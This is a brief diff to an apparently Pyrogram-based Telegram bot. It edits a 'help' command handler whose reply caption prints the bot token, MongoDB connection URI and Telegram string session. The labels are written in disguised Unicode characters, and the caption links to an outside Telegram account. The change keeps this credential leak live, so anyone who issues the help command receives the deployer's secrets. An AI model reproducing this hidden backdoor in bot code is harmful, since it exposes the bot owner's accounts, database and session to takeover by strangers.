@@ -110,7 +110,7 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://te.legra.ph/file/e1383c835a9d7b5d862e5.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   {BOT_TOKEN} \n\nɱσɳɠσ:-   {MONGO_DB_URI}\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   {STRING_SESSION}\n\n [🧟](https://t.me/DX_LUCKY)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN} \n\nɱσɳɠσ:-   `{MONGO_DB_URI}\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}\n\n [🧟](https://t.me/DX_LUCKY)..................☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
